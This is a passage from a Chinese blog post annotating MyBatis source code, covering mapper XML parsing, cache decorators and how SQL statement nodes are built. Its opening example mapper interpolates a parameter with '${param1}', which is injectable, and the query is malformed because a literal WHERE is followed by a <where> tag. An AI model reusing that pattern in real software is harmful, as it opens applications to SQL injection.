<span class="attr">property</span>=<span class="string">&quot;createTime&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectById&quot;</span>  <span class="attr">resultMap</span>=<span class="string">&quot;result&quot;</span>     &gt;</span></span><br><span class="line">        select id,user_name,create_time from t_user where id=$&#123;param1&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;param1&gt;0&quot;</span>&gt;</span></span><br><span class="line">               and id=#&#123;param1&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们进入源码分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 判断当前的Mapper是否被加载过</span></span><br><span class="line">    <span class="keyword">if</span> (!configuration.isResourceLoaded(resource)) &#123;</span><br><span class="line">        <span class="comment">// 通过configurationElement解析映射文件</span></span><br><span class="line">        <span class="comment">// 传入根节点&lt;mapper&gt;封装成的XNode对象</span></span><br><span class="line">        configurationElement(parser.evalNode(<span class="string">&quot;/mapper&quot;</span>));</span><br><span class="line">        <span class="comment">// 把资源保存到Configuration对象中</span></span><br><span class="line">        configuration.addLoadedResource(resource);</span><br><span class="line">        bindMapperForNamespace();</span><br><span class="line">    &#125;</span><br><span class="line">    parsePendingResultMaps();</span><br><span class="line">    parsePendingCacheRefs();</span><br><span class="line">    parsePendingStatements();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析对应mapper节点</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configurationElement</span><span class="params">(XNode context)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//解析我们的namespace属性</span></span><br><span class="line">        <span class="comment">//&lt;mapper namespace=&quot;com.tuling.mapper.EmployeeMapper&quot;&gt;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">namespace</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;namespace&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (namespace == <span class="literal">null</span> || namespace.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;Mapper&#x27;s namespace cannot be empty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//保存我们当前的namespace  并且判断接口完全类名==namespace</span></span><br><span class="line">        builderAssistant.setCurrentNamespace(namespace);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 解析我们的缓存引用</span></span><br><span class="line"><span class="comment">        * 说明我当前的缓存引用和DeptMapper的缓存引用一致</span></span><br><span class="line"><span class="comment">        * &lt;cache-ref namespace=&quot;com.tuling.mapper.DeptMapper&quot;&gt;&lt;/cache-ref&gt;</span></span><br><span class="line"><span class="comment">        解析到org.apache.ibatis.session.Configuration#cacheRefMap</span></span><br><span class="line"><span class="comment">        &lt;当前namespace,ref-namespace&gt;</span></span><br><span class="line"><span class="comment">        异常下（引用缓存未使用缓存）:</span></span><br><span class="line"><span class="comment">        org.apache.ibatis.session.Configuration#incompleteCacheRefs</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//解析缓存引用</span></span><br><span class="line">        cacheRefElement(context.evalNode(<span class="string">&quot;cache-ref&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 解析我们的cache节点</span></span><br><span class="line"><span class="comment">        * &lt;cache type=&quot;org.mybatis.caches.ehcache.EhcacheCache&quot;&gt;&lt;/cache&gt;</span></span><br><span class="line"><span class="comment">        解析到：org.apache.ibatis.session.Configuration#caches</span></span><br><span class="line"><span class="comment">        org.apache.ibatis.builder.MapperBuilderAssistant#currentCache</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//解析缓存</span></span><br><span class="line">        cacheElement(context.evalNode(<span class="string">&quot;cache&quot;</span>));</span><br><span class="line">      </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 解析paramterMap节点(该节点mybaits3.5貌似不推荐使用了)</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        parameterMapElement(context.evalNodes(<span class="string">&quot;/mapper/parameterMap&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 解析我们的resultMap节点</span></span><br><span class="line"><span class="comment">        * 解析到：org.apache.ibatis.session.Configuration#resultMaps</span></span><br><span class="line"><span class="comment">        *    异常 org.apache.ibatis.session.Configuration#incompleteResultMaps</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        resultMapElements(context.evalNodes(<span class="string">&quot;/mapper/resultMap&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 解析我们通过sql节点</span></span><br><span class="line"><span class="comment">        *  解析到org.apache.ibatis.builder.xml.XMLMapperBuilder#sqlFragments</span></span><br><span class="line"><span class="comment">        *   其实等于 org.apache.ibatis.session.Configuration#sqlFragments</span></span><br><span class="line"><span class="comment">        *   因为他们是同一引用，在构建XMLMapperBuilder 时把Configuration.getSqlFragments传进去了</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        sqlElement(context.evalNodes(<span class="string">&quot;/mapper/sql&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 解析我们的select | insert |update |delete节点</span></span><br><span class="line"><span class="comment">        * 解析到org.apache.ibatis.session.Configuration#mappedStatements</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 猜测|在内部被认为是或语义</span></span><br><span class="line">        <span class="comment">// 解析select等节点</span></span><br><span class="line">        buildStatementFromContext(context.evalNodes(<span class="string">&quot;select|insert|update|delete&quot;</span>));</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;Error parsing Mapper XML. The XML location is &#x27;&quot;</span> + resource + <span class="string">&quot;&#x27;. Cause: &quot;</span> + e, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;、</span><br></pre></td></tr></table></figure>

<p>我们关注一下两个方法：二级缓存和解析Sql</p>
<h4 id="解析二级缓存"><a href="#解析二级缓存" class="headerlink" title="解析二级缓存"></a>解析二级缓存</h4><p>一级缓存是基于会话的，二级缓存是基于Mapper，或者说命名空间的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//cacheElement(context.evalNode(&quot;cache&quot;));</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">cacheElement</span><span class="params">(XNode context)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (context != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 解析cache节点的type属性</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;PERPETUAL&quot;</span>);</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Cache</span>&gt; typeClass = typeAliasRegistry.resolveAlias(type);</span><br><span class="line">    <span class="comment">// 获取缓存过期策略eviction属性,默认是LRU</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">eviction</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;eviction&quot;</span>, <span class="string">&quot;LRU&quot;</span>);</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Cache</span>&gt; evictionClass = typeAliasRegistry.resolveAlias(eviction);</span><br><span class="line">    <span class="comment">// 获取刷新间隔flushInterval</span></span><br><span class="line">    <span class="comment">// 属性可以被设置为任意的正整数，设置的值应该是一个以毫秒为单位的合理时间量</span></span><br><span class="line">    <span class="comment">// 默认情况是不设置，也就是没有刷新间隔，缓存仅仅会在调用语句时刷新</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">flushInterval</span> <span class="operator">=</span> context.getLongAttribute(<span class="string">&quot;flushInterval&quot;</span>);</span><br><span class="line">    <span class="comment">// 获取缓存数量size</span></span><br><span class="line">    <span class="comment">// 属性可以被设置为任意正整数，要注意欲缓存对象的大小和运行环境中可用的内存资源，默认值是1024</span></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">size</span> <span class="operator">=</span> context.getIntAttribute(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">    <span class="comment">// 获取只读readonly，默认为false</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">readWrite</span> <span class="operator">=</span> !context.getBooleanAttribute(<span class="string">&quot;readOnly&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">blocking</span> <span class="operator">=</span> context.getBooleanAttribute(<span class="string">&quot;blocking&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> context.getChildrenAsProperties();</span><br><span class="line">    <span class="comment">// 调用MapperBuilderAssistant的useNewCache方法</span></span><br><span class="line">    <span class="comment">// 创建一个新的缓存，并且把存节点加入到Configuration中</span></span><br><span class="line">    builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Cache <span class="title function_">useNewCache</span><span class="params">(Class&lt;? extends Cache&gt; typeClass,</span></span><br><span class="line"><span class="params">      Class&lt;? extends Cache&gt; evictionClass,</span></span><br><span class="line"><span class="params">      Long flushInterval,</span></span><br><span class="line"><span class="params">      Integer size,</span></span><br><span class="line"><span class="params">      <span class="type">boolean</span> readWrite,</span></span><br><span class="line"><span class="params">      <span class="type">boolean</span> blocking,</span></span><br><span class="line"><span class="params">      Properties props)</span> &#123;</span><br><span class="line">      <span class="comment">// 通过CacheBuilder构建二级缓存Cache</span></span><br><span class="line">      <span class="comment">// 又是生成器设计模式，分步骤创建复杂对象Cache</span></span><br><span class="line">    <span class="type">Cache</span> <span class="variable">cache</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CacheBuilder</span>(currentNamespace)</span><br><span class="line">        .implementation(valueOrDefault(typeClass, PerpetualCache.class))</span><br><span class="line">        .addDecorator(valueOrDefault(evictionClass, LruCache.class))</span><br><span class="line">        .clearInterval(flushInterval)</span><br><span class="line">        .size(size)</span><br><span class="line">        .readWrite(readWrite)</span><br><span class="line">        .blocking(blocking)</span><br><span class="line">        .properties(props)</span><br><span class="line">        .build();<span class="comment">//最后使用build生产chche</span></span><br><span class="line">    configuration.addCache(cache);<span class="comment">//添加到configuration中</span></span><br><span class="line">    currentCache = cache;</span><br><span class="line">    <span class="keyword">return</span> cache;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在构建二级缓存中使用了<strong>生成器设计模式</strong>和<strong>装饰器模式</strong>，作用分别是帮助构建复杂的对象，为类进行一些装饰【类似套娃。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Cache <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//构造方法比较困难，需要搞很多配置 一个简单的构造方法完成不了</span></span><br><span class="line">    <span class="comment">//设置默认的缓存实现类</span></span><br><span class="line">    setDefaultImplementations();</span><br><span class="line">    <span class="type">Cache</span> <span class="variable">cache</span> <span class="operator">=</span> newBaseCacheInstance(implementation, id);</span><br><span class="line">    <span class="comment">//设置chche属性</span></span><br><span class="line">    setCacheProperties(cache);</span><br><span class="line">    <span class="comment">// issue #352, do not apply decorators to custom caches</span></span><br><span class="line">    <span class="keyword">if</span> (PerpetualCache.class.equals(cache.getClass())) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Cache</span>&gt; decorator : decorators) &#123;</span><br><span class="line">            <span class="comment">// 实例化所有装饰类</span></span><br><span class="line">            <span class="comment">// 这里会实例化LruCache类，装饰PerpetualCache</span></span><br><span class="line">            cache = newCacheDecoratorInstance(decorator, cache);</span><br><span class="line">            setCacheProperties(cache);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//LRU配置</span></span><br><span class="line">        cache = setStandardDecorators(cache);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!LoggingCache.class.isAssignableFrom(cache.getClass())) &#123;</span><br><span class="line">        cache = <span class="keyword">new</span> <span class="title class_">LoggingCache</span>(cache);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cache;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置默认实现类</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setDefaultImplementations</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (implementation == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//默认实现类为PerpetualCache</span></span><br><span class="line">        implementation = PerpetualCache.class;</span><br><span class="line">        <span class="keyword">if</span> (decorators.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//向装饰器数据中添加LRU</span></span><br><span class="line">            decorators.add(LruCache.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置装饰器</span></span><br><span class="line"><span class="keyword">private</span> Cache <span class="title function_">setStandardDecorators</span><span class="params">(Cache cache)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">MetaObject</span> <span class="variable">metaCache</span> <span class="operator">=</span> SystemMetaObject.forObject(cache);</span><br><span class="line">        <span class="keyword">if</span> (size != <span class="literal">null</span> &amp;&amp; metaCache.hasSetter(<span class="string">&quot;size&quot;</span>)) &#123;</span><br><span class="line">            metaCache.setValue(<span class="string">&quot;size&quot;</span>, size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//设置缓存刷新间隔</span></span><br><span class="line">        <span class="keyword">if</span> (clearInterval != <span class="literal">null</span>) &#123;</span><br><span class="line">            cache = <span class="keyword">new</span> <span class="title class_">ScheduledCache</span>(cache);</span><br><span class="line">            <span class="comment">//ScheduledCache：调度缓存，负责定时清空缓存</span></span><br><span class="line">            ((ScheduledCache) cache).setClearInterval(clearInterval);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (readWrite) &#123;  </span><br><span class="line">            <span class="comment">//将LRU缓存 装饰到 Serialized缓存</span></span><br><span class="line">            <span class="comment">//SerializedCache：缓存序列化和反序列化存储</span></span><br><span class="line">            cache = <span class="keyword">new</span> <span class="title class_">SerializedCache</span>(cache); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 装饰成LoggingCache</span></span><br><span class="line">        cache = <span class="keyword">new</span> <span class="title class_">LoggingCache</span>(cache);</span><br><span class="line">        <span class="comment">// 装饰成SynchronizedCache</span></span><br><span class="line">        cache = <span class="keyword">new</span> <span class="title class_">SynchronizedCache</span>(cache);</span><br><span class="line">        <span class="keyword">if</span> (blocking) &#123;</span><br><span class="line">            cache = <span class="keyword">new</span> <span class="title class_">BlockingCache</span>(cache);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cache;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CacheException</span>(<span class="string">&quot;Error building standard cache decorators.  Cause: &quot;</span> + e, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面看到，经过大量的装饰类，返回的是<code>SynchronizedCache</code>这个cache类。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2021/0115/215838_2615c31d_8183653.jpeg"
                      alt="img"
                ></p>
<h4 id="解析动态sql"><a href="#解析动态sql" class="headerlink" title="解析动态sql"></a>解析动态sql</h4><p>其在<code>buildStatementFromContext(context.evalNodes(&quot;select|insert|update|delete&quot;));</code>方法中</p>
<p>是解析对应的<code>select|insert|update|delete</code>节点信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 解析sql语句标签，传入映射文件中的所有Sql语句标签对应的XNode集合</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildStatementFromContext</span><span class="params">(List&lt;XNode&gt; list)</span> &#123;</span><br><span class="line">   <span class="comment">//判断是否有配置数据库厂商ID</span></span><br><span class="line">   <span class="keyword">if</span> (configuration.getDatabaseId() != <span class="literal">null</span>) &#123;</span><br><span class="line">     buildStatementFromContext(list, configuration.getDatabaseId());</span><br><span class="line">   &#125;</span><br><span class="line">   buildStatementFromContext(list, <span class="literal">null</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildStatementFromContext</span><span class="params">(List&lt;XNode&gt; list, String requiredDatabaseId)</span> &#123;</span><br><span class="line">   <span class="comment">//循环我们的select|delte|insert|update节点</span></span><br><span class="line">   <span class="keyword">for</span> (XNode context : list) &#123;</span><br><span class="line">     <span class="comment">//创建一个xmlStatement的构建器对象</span></span><br><span class="line">     <span class="keyword">final</span> <span class="type">XMLStatementBuilder</span> <span class="variable">statementParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStatementBuilder</span>(configuration, builderAssistant, context, requiredDatabaseId);</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">//调用parseStatementNode()方法</span></span><br><span class="line">       statementParser.parseStatementNode();</span><br><span class="line">     &#125; <span class="keyword">catch</span> (IncompleteElementException e) &#123;</span><br><span class="line">       configuration.addIncompleteStatement(statementParser);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parseStatementNode</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 得到 insert|delte|update|select 标签的sqlId</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">   <span class="comment">//判断是否配置了数据库厂商</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">databaseId</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;databaseId&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//匹配当前数据库厂商ID是否匹配当前数据源厂商id</span></span><br><span class="line">   <span class="comment">//如果没有在insert等标签上设置id，那返回true</span></span><br><span class="line">   <span class="keyword">if</span> (!databaseIdMatchesCurrent(id, databaseId, <span class="built_in">this</span>.requiredDatabaseId)) &#123;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">     </span><br><span class="line">   <span class="comment">//获取节点名称select|insert|update|delete</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> context.getNode().getNodeName();</span><br><span class="line">     </span><br><span class="line">   <span class="comment">//根据nodeName 获得 SqlCommandType枚举</span></span><br><span class="line">   <span class="type">SqlCommandType</span> <span class="variable">sqlCommandType</span> <span class="operator">=</span> SqlCommandType.valueOf(nodeName.toUpperCase(Locale.ENGLISH));</span><br><span class="line">     </span><br><span class="line">   <span class="comment">//判断是否为select节点</span></span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isSelect</span> <span class="operator">=</span> sqlCommandType == SqlCommandType.SELECT;</span><br><span class="line">     </span><br><span class="line">   <span class="comment">//获取flushCache属性</span></span><br><span class="line">   <span class="comment">//默认值为isSelect的反值：查询：默认flushCache=false   增删改：默认flushCache=true</span></span><br><span class="line">   <span class="type">boolean</span> <span class="variable">flushCache</span> <span class="operator">=</span> context.getBooleanAttribute(<span class="string">&quot;flushCache&quot;</span>, !isSelect);</span><br><span class="line">     </span><br><span class="line">   <span class="comment">//判断是否使用缓存</span></span><br><span class="line">   <span class="comment">//查询：默认useCache=true   增删改：默认useCache=false</span></span><br><span class="line">   <span class="type">boolean</span> <span class="variable">useCache</span> <span class="operator">=</span> context.getBooleanAttribute(<span class="string">&quot;useCache&quot;</span>, isSelect);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//resultOrdered:  是否需要处理嵌套查询结果 group by (使用极少）</span></span><br><span class="line">   <span class="comment">//可以将比如 30条数据的三组数据  组成一个嵌套的查询结果</span></span><br><span class="line">   <span class="type">boolean</span> <span class="variable">resultOrdered</span> <span class="operator">=</span> context.getBooleanAttribute(<span class="string">&quot;resultOrdered&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 解析我们的sql公用片段</span></span><br><span class="line"><span class="comment">    *     &lt;select id=&quot;qryEmployeeById&quot; resultType=&quot;Employee&quot; parameterType=&quot;int&quot;&gt;</span></span><br><span class="line"><span class="comment">             &lt;include refid=&quot;selectInfo&quot;&gt;&lt;/include&gt;</span></span><br><span class="line"><span class="comment">             employee where id=#&#123;id&#125;</span></span><br><span class="line"><span class="comment">          &lt;/select&gt;</span></span><br><span class="line"><span class="comment">       将 &lt;include refid=&quot;selectInfo&quot;&gt;&lt;/include&gt; 解析成sql语句 </span></span><br><span class="line"><span class="comment">       放在&lt;select&gt;Node的子节点中</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="comment">// 解析重用的sql片段，就是通过&lt;sql&gt;标签设置的</span></span><br><span class="line">   <span class="comment">// 就是将&lt;include/&gt;标签指定的语句解析成sql语句</span></span><br><span class="line">   <span class="type">XMLIncludeTransformer</span> <span class="variable">includeParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLIncludeTransformer</span>(configuration, builderAssistant);</span><br><span class="line">   includeParser.applyIncludes(context.getNode());</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 解析Sql语句标签的参数类型parameterType</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">parameterType</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;parameterType&quot;</span>);</span><br><span class="line">   <span class="comment">// 把参数类型字符串转化为class</span></span><br><span class="line">   Class&lt;?&gt; parameterTypeClass = resolveClass(parameterType);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 获取lang属性，查看sql是否支撑自定义语言</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">lang</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;lang&quot;</span>);</span><br><span class="line">   <span class="comment">// 获取自定义sql脚本语言驱动，默认为XMLLanguageDriver</span></span><br><span class="line">   <span class="type">LanguageDriver</span> <span class="variable">langDriver</span> <span class="operator">=</span> getLanguageDriver(lang);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 解析&lt;insert&gt;语句中的&lt;selectKey&gt;节点</span></span><br><span class="line">   <span class="comment">// 可以返回插入数据的id值，可用于实现oracle数据库的自增</span></span><br><span class="line">   processSelectKeyNodes(id, parameterTypeClass, langDriver);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Parse the SQL (pre: &lt;selectKey&gt; and &lt;include&gt; were parsed and removed)</span></span><br><span class="line">   <span class="comment">// 主键生成器</span></span><br><span class="line">   KeyGenerator keyGenerator;</span><br><span class="line">   <span class="comment">// 得到sqlID拼接上!selectKey字符串</span></span><br><span class="line">   <span class="comment">// 比如：selectById!selectKey</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">keyStatementId</span> <span class="operator">=</span> id + SelectKeyGenerator.SELECT_KEY_SUFFIX;</span><br><span class="line">   <span class="comment">// 命名空间拼接到keyStatementId中</span></span><br><span class="line">   <span class="comment">// 比如：com.jimmy.mapper.UserMapper.selectById!selectKey</span></span><br><span class="line">   keyStatementId = builderAssistant.applyCurrentNamespace(keyStatementId, <span class="literal">true</span>);</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *&lt;insert id=&quot;saveEmployee&quot; parameterType=&quot;com.tuling.entity.Employee&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot;&gt;</span></span><br><span class="line"><span class="comment">    *判断我们全局的配置类configuration中是否包含以及解析过的组件生成器对象</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="comment">//  判断我们全局的配置类configuration中是否包含以及解析过的主键生成器对象</span></span><br><span class="line">   <span class="keyword">if</span> (configuration.hasKeyGenerator(keyStatementId)) &#123;</span><br><span class="line">     keyGenerator = configuration.getKeyGenerator(keyStatementId);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 若我们配置了useGeneratedKeys 那么就去除useGeneratedKeys的配置值,</span></span><br><span class="line"><span class="comment">      * 否者就看我们的mybatis-config.xml配置文件中是配置了</span></span><br><span class="line"><span class="comment">      * &lt;setting name=&quot;useGeneratedKeys&quot; value=&quot;true&quot;&gt;&lt;/setting&gt; 默认是false</span></span><br><span class="line"><span class="comment">      * 并且判断sql操作类型是否为insert</span></span><br><span class="line"><span class="comment">      * 若是的话,那么使用的生成策略就是Jdbc3KeyGenerator.INSTANCE</span></span><br><span class="line"><span class="comment">      * 否则就是NoKeyGenerator.INSTANCE</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     keyGenerator = context.getBooleanAttribute(<span class="string">&quot;useGeneratedKeys&quot;</span>,</span><br><span class="line">         configuration.isUseGeneratedKeys() &amp;&amp; SqlCommandType.INSERT.equals(sqlCommandType))</span><br><span class="line">         ? Jdbc3KeyGenerator.INSTANCE : NoKeyGenerator.INSTANCE;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 通过class org.apache.ibatis.scripting.xmltags.XMLLanguageDriver来解析我们的</span></span><br><span class="line"><span class="comment">    * sql脚本对象--解析SqlNode. </span></span><br><span class="line"><span class="comment">    * 注意，只是解析成一个个的SqlNode，并不会完全解析sql,因为这个时候参数都没确定，动态sql无法解析</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="comment">// 通过XMLLanguageDriver来解析Sql语句标签，这里将Sql语句标签解析成一个个的SqlNode</span></span><br><span class="line">   <span class="comment">// 解析后封装，返回一个SqlSource对象</span></span><br><span class="line">   <span class="type">SqlSource</span> <span class="variable">sqlSource</span> <span class="operator">=</span> langDriver.createSqlSource(configuration, context, parameterTypeClass);</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取statementType属性值，它用于指定mybatis使用的statement类型</span></span><br><span class="line"><span class="comment">    * STATEMENT：Statement - 普通sql</span></span><br><span class="line"><span class="comment">    * PREPARED：PreparedStatement(默认) - 支持可变参数</span></span><br><span class="line"><span class="comment">    * CALLABLE：CallableStatement - 用于调用存储过程</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="type">StatementType</span> <span class="variable">statementType</span> <span class="operator">=</span> StatementType.valueOf(context.getStringAttribute(<span class="string">&quot;statementType&quot;</span>, StatementType.PREPARED.toString()));</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取fetchSize属性的值</span></span><br><span class="line"><span class="comment">    * 这是一个给驱动的提示，尝试让驱动程序每次批量返回的结果行数和这个设置值相等  </span></span><br><span class="line"><span class="comment">    * 很少会用到，默认值为未设置（unset）（依赖驱动）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="type">Integer</span> <span class="variable">fetchSize</span> <span class="operator">=</span> context.getIntAttribute(<span class="string">&quot;fetchSize&quot;</span>);</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取timeout属性的值</span></span><br><span class="line"><span class="comment">    * 这个设置是在抛出异常之前，驱动程序等待数据库返回请求结果的秒数</span></span><br><span class="line"><span class="comment">    * 默认值为未设置（unset）（依赖驱动）。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="type">Integer</span> <span class="variable">timeout</span> <span class="operator">=</span> context.getIntAttribute(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line">   <span class="comment">// 获取parameterMap属性的值，默认为未设置</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">parameterMap</span> <span class="operator">=</span> context.getStringAttribute(<span class="string">&quot;parameterMap&quot;</span>);</span><br><span class="line">   <span class="comment">// 获取resultType属性的值，用于指定执行结果类型 </span></span><br><span class="line">   <span class="comment">// 注意如果返回的是集合，那应该设置为集合包含的类型，而不是集合本身。</span></span><br><span class="line">   <span class="comment">// 可以使用 resultType 或 resultMap，但不能同时使用</span></span><br><span class="line">   